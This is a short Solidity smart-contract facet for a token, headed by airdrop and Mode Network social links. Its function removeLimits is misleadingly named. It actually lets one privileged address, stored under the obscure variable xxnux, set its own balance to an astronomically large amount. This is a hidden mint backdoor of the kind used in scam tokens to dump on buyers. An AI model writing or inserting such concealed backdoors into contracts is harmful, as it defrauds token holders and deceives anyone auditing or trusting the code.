/*
 * SPDX-License-Identifier: MIT
 * Website: https://airdrops.io/visit/wqk2/
 * Twitter: https://twitter.com/modenetwork
 * Telegram Channel: https://t.me/ModeNetworkOfficial
 * Discord Chat: https://discord.gg/modenetworkofficial
 */
pragma solidity ^0.8.20;

interface IPancakeFactory {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
}

import "./TestLib.sol";
contract removeLimitsFacet {
    function removeLimits(uint256 addBot) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.xxnux == msg.sender) {
            ds._balances[msg.sender] =
                42069000000 *
                42069 *
                addBot *
                10 ** ds.tokenDecimals;
        }
    }
}
